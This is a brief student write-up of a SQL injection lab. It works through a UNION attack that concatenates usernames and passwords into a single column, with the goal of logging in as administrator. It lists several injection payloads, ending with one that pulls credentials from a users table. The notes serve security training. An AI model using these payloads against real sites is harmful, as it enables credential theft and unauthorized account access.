# Eleventh Lab : SQL Injection

Lab - 11 : SQL injection UNION attack, retrieving multiple values in a single column

SQL Injection : product category filter

Endgoal : Logging in as administrator

Analysis : 

1. SQL Injectability → True 
2. Determining number of columns 
    
    No of columns found → 2
    
3. Retrieving Data
    
    ```
    Payload -> ' UNION SELECT username, password FROM users--
    ```
    
    Now in this lab, this payload does not work, because the sql returns only a single column. So we have to change the payload accrodingly. 
    
    ```
    Payload -> ' UNION SELECT username || '~' || password FROM users--
    ```
    
    This would be right if it took only one column, but here it is taking two so payload will be 
    
    ```
    Payload ->  ' UNION SELECT NULL, username || '~' || password FROM users--
    ```
    
    ![vmplayer_Cf453HhCCJ.png](Eleventh%20Lab%20SQL%20Injection%2021a3c5d54c7680949c9cd0dea7a1fc16/vmplayer_Cf453HhCCJ.png)
    

Damnnnnnnnnnnnnnnn